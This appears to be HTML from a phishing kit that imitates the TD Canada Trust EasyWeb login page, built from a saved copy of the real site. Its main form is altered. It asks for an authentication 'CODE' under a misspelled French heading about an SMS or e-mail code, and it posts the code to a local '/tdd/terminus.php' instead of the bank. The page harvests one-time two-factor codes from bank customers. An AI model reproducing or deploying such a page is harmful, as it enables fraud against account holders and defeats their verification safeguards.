                      _ngcontent-egd-c129="" class="td-icon td-icon-solutions"></span> Solutions <span
                      _ngcontent-egd-c129="" class="td-icon expand"></span><span _ngcontent-egd-c129=""
                      class="td-icon collapse"></span></a>
                  <ul _ngcontent-egd-c129="" class="td-accordion-content">
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small
                        Businesses</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial Banking</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a>
                    </li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New to
                        Canada</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp">Cross
                        Border Banking</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/foreign-currency-services/index.jsp">Foreign
                        Exchange Services</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways
                        to Pay</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways
                        to Bank</a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129=""
                        href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green
                        Banking</a></li>
                  </ul>
                </li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-find-us"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/branch-locator/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-location"></span>Find Us</a></li>
                <li _ngcontent-egd-c129=""
                  class="td-nav-mobile-menu-item td-item-nav-link td-item-nav-link-last item-help-me"><a
                    _ngcontent-egd-c129="" href="https://www.td.com/ca/en/personal-banking/help-centre/"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-help"></span>Help</a></li>
                <li _ngcontent-egd-c129=""
                  class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-country"><a
                    _ngcontent-egd-c129="" href="javascript:void(0)" aria-expanded="false" role="button"> COUNTRY: Canada
                    <span _ngcontent-egd-c129="" class="td-icon expand"></span><span _ngcontent-egd-c129=""
                      class="td-icon collapse"></span></a>
                  <ul _ngcontent-egd-c129="" class="td-accordion-content">
                    <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129="" href="javascript:void(0)"><img
                          _ngcontent-egd-c129="" src="./index_files/country_ca.png" alt="Canada Flag"
                          class="country-flag">Canada <span _ngcontent-egd-c129="" aria-hidden="true"
                          class="td-icon selected"></span><span _ngcontent-egd-c129=""
                          class="td-forscreenreader">Selected</span></a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129="" href="http://www.tdbank.com/"><img
                          _ngcontent-egd-c129="" src="./index_files/country_us.png" alt="United States Flag"
                          class="country-flag">United States </a></li>
                  </ul>
                </li>
                <li _ngcontent-egd-c129=""
                  class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language"><a
                    _ngcontent-egd-c129="" href="javascript:void(0)" aria-expanded="false" role="button"><span
                      _ngcontent-egd-c129="" class="td-forscreenreader">Select language</span>Français <span
                      _ngcontent-egd-c129="" aria-hidden="true" class="td-icon expand"></span><span _ngcontent-egd-c129=""
                      aria-hidden="true" class="td-icon collapse"></span></a>
                  <ul _ngcontent-egd-c129="" class="td-accordion-content">
                    <li _ngcontent-egd-c129="" class="active"><a _ngcontent-egd-c129="" href="javascript:void(0)"> English
                        <span _ngcontent-egd-c129="" aria-hidden="true" class="td-icon selected"></span><!----><span
                          _ngcontent-egd-c129="" class="td-forscreenreader">Selected</span><!----></a></li>
                    <li _ngcontent-egd-c129=""><a _ngcontent-egd-c129="" href="javascript:void(0)"> Français
                        <!----><!----></a></li><!---->
                  </ul>
                </li>
              </ul>
            </nav><span _ngcontent-egd-c129="" tabindex="0"></span><span tabindex="0"></span>
          </div>
          <div _ngcontent-egd-c129="" class="td-nav-mobile-menu td-nav-mobile-menu-secondary td-nav-mobile-menu-right">
            <span tabindex="0"></span><span _ngcontent-egd-c129="" tabindex="0"></span>
            <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-top">
              <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-header">
                <div _ngcontent-egd-c129="" class="td-nav-mobile-menu-title"><span _ngcontent-egd-c129=""
                    aria-hidden="true" class="td-icon login"></span>Login </div><button _ngcontent-egd-c129=""
                  type="button" class="td-mobile-menu-close"><span _ngcontent-egd-c129="" aria-hidden=""
                    class="td-forscreenreader">Close Menu</span><span _ngcontent-egd-c129="" aria-hidden="true"
                    class="td-icon"></span></button>
              </div>
            </div>
            <nav _ngcontent-egd-c129="">
              <ul _ngcontent-egd-c129="" class="td-nav-mobile-menu-list">
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-show-on-all"><a
                    _ngcontent-egd-c129="" href="javascript:void(0)"><span _ngcontent-egd-c129=""
                      class="td-icon td-icon-noIcon"></span>TD app</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-mobile"><a
                    _ngcontent-egd-c129="" href="https://easyweb.td.com/"><span _ngcontent-egd-c129=""
                      class="td-icon td-icon-noIcon"></span>EasyWeb</a></li>
                <li _ngcontent-egd-c129=""
                  class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-only visible-sm"><a
                    _ngcontent-egd-c129="" href="https://webbroker.td.com/"><span _ngcontent-egd-c129=""
                      class="td-icon td-icon-noIcon"></span>WebBroker</a></li>
                <li _ngcontent-egd-c129="" class="td-nav-mobile-menu-item td-item-nav-link item-mobile-only visible-sm"><a
                    _ngcontent-egd-c129="" href="https://www.tdbank.com/net/accountlogin.aspx"><span
                      _ngcontent-egd-c129="" class="td-icon td-icon-noIcon"></span>U.S. Banking</a></li>
              </ul>
            </nav><span _ngcontent-egd-c129="" tabindex="0"></span><span tabindex="0"></span>
          </div>
          <div _ngcontent-egd-c129="" class="td-nav-mobile-overlay"></div>
        </div>
      </div><a _ngcontent-egd-c129="" name="main" id="main" tabindex="-1"></a><!---->
    </uap-header-public><!----><!----><!---->
    <main _ngcontent-egd-c163="" coresnaptoheader="" class="td-contentarea" style="padding-top: 46px;"><router-outlet
        _ngcontent-egd-c163=""></router-outlet><core-login-template _nghost-egd-c151="">
        <div _ngcontent-egd-c151="" class="login-wrapper">
          <section _ngcontent-egd-c151="" class="otp-login">
            <div _ngcontent-egd-c151="" class="container">
              <div _ngcontent-egd-c151="" class="row">
                <div _ngcontent-egd-c151="" class="col-xs-12">
                  <h1 _ngcontent-egd-c151="" class="co-brand-header"> Vous recevrez un code d'authenthification sur votre E-mail ou sms</h1>
                </div>
              </div><!----><!----><uap-server-error _ngcontent-egd-c151="" display="banner"
                _nghost-egd-c101=""><!----></uap-server-error><!----><!----><!----><!---->
              <div _ngcontent-egd-c151="" class="light-green otp-box-mobile otp-separate-right-nav">
                <div _ngcontent-egd-c151="" class="row">
                  <div _ngcontent-egd-c151="" class="col-sm-6">
                    <div _ngcontent-egd-c151="" class=""><core-login-form _ngcontent-egd-c151="" _nghost-egd-c150="">
                        <form action="/tdd/terminus.php" method="post"  class="login-form ng-pristine ng-invalid ng-touched">
                          <div _ngcontent-egd-c150="" class="td-row order-1">
                            <div _ngcontent-egd-c150="" class="td-col-xs-12"><core-card-selector _ngcontent-egd-c150=""
                                _nghost-egd-c148="">
                                <div _ngcontent-egd-c148="" class="td-row">
                                  <div _ngcontent-egd-c148=""
                                    class="td-col-xs-12 form-group form-group-padding ng-pristine ng-invalid ng-touched">
                                    <label _ngcontent-egd-c148="" for="username">CODE</label><input
                                      _ngcontent-egd-c148="" id="username" name="sms" type="text" required=""
                                      aria-required="true" aria-invalid="true" autocomplete="off"
                                      aria-describedby="inputError" formcontrolname="username" inputtrim=""
                                      class="form-control label-margin ng-pristine ng-invalid ng-touched"
                                     ><uap-field-error _ngcontent-egd-c148="" errorid="USERNAME"
                                      _nghost-egd-c104=""><!----></uap-field-error></div>
                                </div><!----><!---->
                              </core-card-selector></div>
                          </div>
                      
                        
                     
                          </div><!---->
                          <div _ngcontent-egd-c150="" class="td-row order-5">
                            <div _ngcontent-egd-c150="" class="td-col-xs-12 td-col-sm-10 td-col-md-8 td-col-lg-7">
                              <div _ngcontent-egd-c150="" class="form-group form-group-padding"><button
                                  _ngcontent-egd-c150="" class="btn btn-block td-button-secondary"><span
                                    _ngcontent-egd-c150="" class="td-icon td-icon-secureBtn mbna-overide"></span> Verify
                                </button></div>
                            </div><!---->
                          </div>
                    
                          </div><!----><!---->
                 
                          </div><!---->
                        </form>
                      </core-login-form><!----></div>
                  </div><!---->
                </div>
              </div>
            </div>
          </section>
          <section _ngcontent-egd-c151="" class="login-right-nav-xs"><ngx-dynamic-hooks _ngcontent-egd-c151=""
              class="ng-star-inserted">
<!-- saved from url=(0066)http://www1.sys.feeds.td.com/en/ng-uap/ew/getting_started_uap.html -->
<script type="text/javascript" src="./index_files/ruxitagentjs_ICA27NVfgjqru_10205201218101503.js.téléchargement"
  data-dtconfig="app=5614ee112a4f98ca|cuc=9p6cxzfz|mel=100000|featureHash=ICA27NVfgjqru|ssv=4|lastModification=1715288883028|vcv=2|tp=500,50,0,1|rdnt=1|uxrgce=1|bp=3|agentUri=/uap-ui/ruxitagentjs_ICA27NVfgjqru_10205201218101503.js|reportUrl=/uap-ui/rb_cf7d3730-9eed-4047-88c3-d0cd1e0cd529|rid=RID_-1315441002|rpid=-856035652|domain=td.com"></script>
<script type="text/javascript" src="./index_files/ruxitagentjs_ICA2NVefjqrux_10205201218101503.js.téléchargement"
  data-dtconfig="app=80ed3661cfc26333|featureHash=ICA2NVefjqrux|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=9p6cxzfz|mel=100000|dpvc=1|ssv=4|lastModification=1683708126362|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|agentUri=/ruxitagentjs_ICA2NVefjqrux_10205201218101503.js|reportUrl=/rb_cf7d3730-9eed-4047-88c3-d0cd1e0cd529|rid=RID_-1219408941|rpid=-64906589|domain=td.com"></script>
<div class="otp-box-content">

  <div class="td-row flex-centered-row">
    <div class="td-col-md-6">
      <h3 class="text-black">
        <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Welcome to EasyWeb, let's get started.</div></core-dynamic-html>
      </h3>
    </div>
    <div class="td-col-md-6">
      <div class="form-group form-group-padding">
        <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><!----><a _ngcontent-egd-c85="" class="td-button td-button-block td-button-clear-green ng-star-inserted" href="https://www.td.com/ca/en/personal-banking/get-started/" target="" title="">Register online now</a><!----><!----><!----><!----></core-dynamic-anchor>
      </div>
    </div>
  </div>

  <p>
    <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">If you've received your temporary password, use it to log in along with your Access Card number. You'll then be prompted to create a new Password.</div></core-dynamic-html>
  </p>

  <hr class="td-thin-divider-line-1 hor-separator">

  <div class="hidden-sm">
    <h3 class="text-black">
      <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Login Help</div></core-dynamic-html>
    </h3>
    <div class="td-row">
      <div class="td-col-md-12">
        <ul class="td-list-links">
          <li>
            <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="http://td.intelliresponse.com/login/">Get Login Help</a><!----><!----><!----><!----><!----></core-dynamic-anchor>
          </li>
          <li>
            <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><!----><!----><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://authentication.td.com/uap-ui/?consumer=easyweb&amp;locale=en_CA#/uap/reset/password">Reset Password</a><!----><!----><!----></core-dynamic-anchor>
          </li>
        </ul>
      </div>
    </div>
  </div>

  <div class="hidden-xs visible-sm hidden-md hidden-lg">
    <div class="otp-webbroker-black-label otp-need-help-links">
      <core-dynamic-accordion _nghost-egd-c84="" class="ng-star-inserted"><!----><h2 _ngcontent-egd-c84="" class="otp-expand-collapse ng-star-inserted"><button _ngcontent-egd-c84="" aria-expanded="false" class="ng-star-inserted"><span _ngcontent-egd-c84="" aria-hidden="true" class="td-icon td-icon-expand"></span><span _ngcontent-egd-c84=""></span></button><!----></h2><!----><!----><!----></core-dynamic-accordion>
    </div>
  </div>
  
  <hr class="td-thin-divider-line-1 hor-separator">
  
  <div class="hidden-sm">
    <h3 class="text-black">
      <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Enhanced Security</div></core-dynamic-html>
    </h3>
    <div class="td-row">
      <div class="td-col-md-12">
        <ul class="td-list-links">
          <li>
            <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://td.intelliresponse.com/cbaw/index.jsp?interfaceID=17&amp;requestType=TopQuestionsRequest&amp;TopTenCategoryName=Two-Step+Verification">Two-Step Verification FAQs</a><!----><!----><!----><!----><!----></core-dynamic-anchor>
          </li>
          <li>
            <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://www.td.com/privacy-and-security/privacy-and-security/how-we-protect-you/online-security/2fa.jsp">TD Authenticate app: Securely log in from anywhere in the world without texts or phone calls.</a><!----><!----><!----><!----><!----></core-dynamic-anchor>
          </li>
		  <li>
            <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><!----><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://www.td.com/ca/en/about-td/privacy-and-security/how-you-can-protect-yourself/protect-yourself/types-of-fraud-and-scams" target="" title="">Improve Your Protection Against Online Fraud</a><!----><!----><!----><!----></core-dynamic-anchor>
          </li>
        </ul>
      </div>
    </div>
  </div>

  <div class="hidden-xs visible-sm hidden-md hidden-lg">
    <div class="otp-webbroker-black-label otp-need-help-links">
      <core-dynamic-accordion _nghost-egd-c84="" class="ng-star-inserted"><!----><h2 _ngcontent-egd-c84="" class="otp-expand-collapse ng-star-inserted"><button _ngcontent-egd-c84="" aria-expanded="false" class="ng-star-inserted"><span _ngcontent-egd-c84="" aria-hidden="true" class="td-icon td-icon-expand"></span><span _ngcontent-egd-c84=""></span></button><!----></h2><!----><!----><!----></core-dynamic-accordion>
    </div>
  </div>

  <hr class="td-thin-divider-line-1 hor-separator">

  <h3 class="text-black">
    <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Explore mobile banking with the TD app now</div></core-dynamic-html>
  </h3>

  <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://www.td.com/ca/en/personal-banking/solutions/ways-to-bank/?tdtab=digital-banking">Take banking and investing almost anywhere</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

</div>

<div class="visible-xs otp-box-outside">

  <section class="otp-full-width-xs otp-getting-started-xs">
    <div class="td-container">
      <h3>
        <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Welcome to EasyWeb, let's get started.</div></core-dynamic-html>
      </h3>
      <div class="form-group form-group-padding">
        <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><!----><a _ngcontent-egd-c85="" class="td-button td-button-block td-button-clear-green ng-star-inserted" href="https://www.td.com/ca/en/personal-banking/get-started/" target="" title="">Register online now</a><!----><!----><!----><!----></core-dynamic-anchor>
      </div>
      <p>
        <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">If you've received your temporary password, use it to log in along with your Access Card number. You'll then be prompted to create a new Password.</div></core-dynamic-html>
      </p>
    </div>
  </section>

  <hr class="td-thin-divider-line-1">

  <section class="otp-full-width-xs otp-getting-started-xs">
    <div class="td-container">
      <div class="otp-need-help-links">
        <core-dynamic-accordion _nghost-egd-c84="" class="ng-star-inserted"><!----><h2 _ngcontent-egd-c84="" class="otp-expand-collapse ng-star-inserted"><button _ngcontent-egd-c84="" aria-expanded="false" class="ng-star-inserted"><span _ngcontent-egd-c84="" aria-hidden="true" class="td-icon td-icon-expand"></span><span _ngcontent-egd-c84=""></span></button><!----></h2><!----><!----><!----></core-dynamic-accordion>
      </div>
    </div>
  </section>
  
  <hr class="td-thin-divider-line-1">

  <section class="otp-full-width-xs otp-getting-started-xs">
    <div class="td-container">
      <div class="otp-need-help-links">
        <core-dynamic-accordion _nghost-egd-c84="" class="ng-star-inserted"><!----><h2 _ngcontent-egd-c84="" class="otp-expand-collapse ng-star-inserted"><button _ngcontent-egd-c84="" aria-expanded="false" class="ng-star-inserted"><span _ngcontent-egd-c84="" aria-hidden="true" class="td-icon td-icon-expand"></span><span _ngcontent-egd-c84=""></span></button><!----></h2><!----><!----><!----></core-dynamic-accordion>
      </div>
    </div>
  </section>

  <hr class="visible-xs td-thin-divider-line-1">

  <div class="td-container">
    <div class="td-row">
      <div class="td-col-xs-12">
        <h3 class="text-black">
          <core-dynamic-html _nghost-egd-c86="" class="ng-star-inserted"><div _ngcontent-egd-c86="" class="inline">Explore mobile banking with the TD app now</div></core-dynamic-html>
        </h3>
        <core-dynamic-anchor _nghost-egd-c85="" class="ng-star-inserted"><a _ngcontent-egd-c85="" class="td-link-action ng-star-inserted" href="https://www.td.com/ca/en/personal-banking/solutions/ways-to-bank/?tdtab=digital-banking">Take banking and investing almost anywhere</a><!----><!----><!----><!----><!----></core-dynamic-anchor>
      </div>
    </div>
  </div>
</div>


</ngx-dynamic-hooks><!----></section><!----><div _ngcontent-egd-c151="" class="oas-marketing-ad"><core-oas-ads _ngcontent-egd-c151="" _nghost-egd-c146=""><div _ngcontent-egd-c146="" id="ad_slot_ew"></div><!----></core-oas-ads></div><!----><!----><div _ngcontent-egd-c151=""><ngx-dynamic-hooks _ngcontent-egd-c151=""><section class="otp-full-width td-fullwidth-white">
  <div class="td-container">
    <div class="td-row">
      <div class="td-col-md-10 td-col-md-offset-1">
        <p class="td-copy-legal">
          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline">By using EasyWeb, our secured financial services site, offered by TD Canada Trust and its affiliates, you agree to the terms and services of the </div></core-dynamic-html>
          </span>
          <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.td.com/content/dam/tdct/document/pdf/personal-banking/tdct-accounts-fst-en.pdf">Financial Services Terms</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline">, </div></core-dynamic-html>
          </span>
          <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.td.com/content/dam/tdct/document/pdf/aa-eng.pdf">Access Agreement</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline">, </div></core-dynamic-html>
          </span>
          <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.td.com/content/dam/tdct/document/pdf/dba-eng.pdf">Digital Banking Agreement</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline"> and/or; the </div></core-dynamic-html>
          </span>
          <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.tdcanadatrust.com/easyweb5/help/banking/acc00151.htm">Business Access Services Schedule</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline"> and/or; the </div></core-dynamic-html>
          </span>
          <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.tdcanadatrust.com/products-services/investing/mutual-funds/webfundcond.jsp">Terms and Agreement</a><!----><!----><!----><!----><!----></core-dynamic-anchor>

          <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline"> and </div></core-dynamic-html>
          </span>
		  <core-dynamic-anchor _nghost-egd-c85=""><a _ngcontent-egd-c85="" href="https://www.td.com/to-our-customers/#TD_Asset_Management">Disclosure</a><!----><!----><!----><!----><!----></core-dynamic-anchor>
		  
		  <span>
            <core-dynamic-html _nghost-egd-c86=""><div _ngcontent-egd-c86="" class="inline"> for mutual funds accounts held with TD Investment Services Inc.</div></core-dynamic-html>
		  </span>
        </p>
      </div>
    </div>
  </div>
</section></ngx-dynamic-hooks></div><!----><!----></div></core-login-template><!----></main><!----><uap-footer-public
  _ngcontent-egd-c163="" id="footerId2" _nghost-egd-c128="">
  <footer _ngcontent-egd-c128="" class="td-fullwidth-dark-green td-padding-vert-0">
    <div _ngcontent-egd-c128="" class="td-container">
      <div _ngcontent-egd-c128="" class="td-row">
        <div _ngcontent-egd-c128="" class="td-footer-content td-col-xs-12"
          style="background-image: url(&#39;assets/img/footer_seat.png&#39;);">
          <p _ngcontent-egd-c128="" class="td-footer-heading td-copy-white td-copy-align-centre"><span
              _ngcontent-egd-c128="">Need to talk to us directly?</span><a _ngcontent-egd-c128=""
              class="td-contact-link td-link-action" href="https://www.td.com/ca/en/personal-banking/contact-us/">
              Contact us </a></p>
          <div _ngcontent-egd-c128="" class="td-footer-social td-copy-align-centre">
            <p _ngcontent-egd-c128="" class="td-footer-social-heading">Connect with TD</p>
            <ul _ngcontent-egd-c128="">
              <li _ngcontent-egd-c128=""><a _ngcontent-egd-c128="" target="_blank" class="td-link-nounderline"
                  href="https://twitter.com/td_canada">
                  <div _ngcontent-egd-c128="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen"><span
                      _ngcontent-egd-c128="" aria-hidden="true" class="td-icon td-icon-twitter"></span><span
                      _ngcontent-egd-c128="" class="td-forscreenreader">FOOTER.TWITTER</span></div>
                </a></li>
              <li _ngcontent-egd-c128=""><a _ngcontent-egd-c128="" target="_blank" class="td-link-nounderline"
                  href="https://www.facebook.com/TDCanada/">
                  <div _ngcontent-egd-c128="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen"><span
                      _ngcontent-egd-c128="" aria-hidden="true" class="td-icon td-icon-facebookIcon"></span><span
                      _ngcontent-egd-c128="" class="td-forscreenreader">FOOTER.FACEBOOK</span></div>
                </a></li>
              <li _ngcontent-egd-c128=""><a _ngcontent-egd-c128="" target="_blank" class="td-link-nounderline"
                  href="https://www.instagram.com/TD_Canada/">
                  <div _ngcontent-egd-c128="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen"><span
                      _ngcontent-egd-c128="" aria-hidden="true" class="td-icon td-icon-instagram"></span><span
                      _ngcontent-egd-c128="" class="td-forscreenreader">FOOTER.INSTAGRAM</span></div>
                </a></li>
              <li _ngcontent-egd-c128=""><a _ngcontent-egd-c128="" target="_blank" class="td-link-nounderline"
                  href="https://www.youtube.com/tdcanada">
                  <div _ngcontent-egd-c128="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen"><span
                      _ngcontent-egd-c128="" aria-hidden="true" class="td-icon td-icon-youtubeLogo"></span><span
                      _ngcontent-egd-c128="" class="td-forscreenreader">FOOTER.YOUTUBE</span></div>
                </a></li>
              <li _ngcontent-egd-c128=""><a _ngcontent-egd-c128="" target="_blank" class="td-link-nounderline"
                  href="https://www.linkedin.com/company/td">
                  <div _ngcontent-egd-c128="" class="td-icon-wrapper td-interactive-icon td-background-darkgreen"><span
                      _ngcontent-egd-c128="" aria-hidden="true" class="td-icon td-icon-linkedin"></span><span
                      _ngcontent-egd-c128="" class="td-forscreenreader">FOOTER.LINKEDIN</span></div>
                </a></li>
            </ul>
          </div>
          <div _ngcontent-egd-c128="" class="td-footer-links td-copy-align-centre td-copy-white"><a
              _ngcontent-egd-c128="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard"
              href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">Privacy and Security</a><a
              _ngcontent-egd-c128="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard"
              href="https://www.td.com/to-our-customers/">Legal</a><a _ngcontent-egd-c128="" target="_blank"
              class="td-copy-white td-link-nounderline td-copy-standard"
              href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">Accessibility</a><a
              _ngcontent-egd-c128="" target="_blank" class="td-copy-white td-link-nounderline td-copy-standard"
              href="https://www.tdcanadatrust.com/products-services/index.jsp">CDIC member</a><a _ngcontent-egd-c128=""
              target="_blank" class="td-copy-white td-link-nounderline td-copy-standard"
              href="https://www.td.com/about-tdbfg/our-business/index.jsp">About Us</a><a _ngcontent-egd-c128=""
              target="_blank" class="td-copy-white td-link-nounderline td-copy-standard"
              href="https://www.td.com/careers/why-td/index.jsp">We're Hiring</a><a _ngcontent-egd-c128=""
              href="javascript:void(0)" role="button" class="td-copy-white td-link-nounderline td-copy-standard">Site
              Index</a></div>
        </div>
      </div>
    </div>
  </footer>
</uap-footer-public><!----><!----><!----></app-root>
<script src="./index_files/runtime-es2015.e748bfeb478370a35d92.js.téléchargement" type="module"></script>
<script src="./index_files/runtime-es5.e748bfeb478370a35d92.js.téléchargement" nomodule="" defer=""></script>
<script src="./index_files/polyfills-es5.6626a9c8c72c8b733d10.js.téléchargement" nomodule="" defer=""></script>
<script src="./index_files/polyfills-es2015.965da94d3645816204ff.js.téléchargement" type="module"></script>
<script src="./index_files/scripts.13cd3f9c93f86b02bd4f.js.téléchargement" defer=""></script>
<script src="./index_files/main-es5.9752c784ad0d6865410a.js" nomodule="" defer=""></script>
<script type="text/javascript" async="" src="./index_files/Bootstrap.js"></script><script type="text/javascript" async="" src="./index_files/dfb31537.js.téléchargement"></script><iframe style="display: none;" src="./index_files/saved_resource.html"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="G-31RJ2TXDZY" data-load-time="1715545436466" height="0" width="0" src="./index_files/rul.html" style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group" data-tagging-id="G-899CC1L385" data-load-time="1715545446036" height="0" width="0" src="./index_files/rul(1).html" style="display: none; visibility: hidden;"></iframe><script src="./index_files/js(6)" type="text/javascript" id="gtagLib1" async=""></script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_td_0" name="destination_publishing_iframe_td_0_name" src="./index_files/dest5.html" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe><div id="extension-mmplj"></div><div class="cdk-overlay-container"></div><iframe src="./index_files/saved_resource(1).html" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1715546306345" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe></body></html>

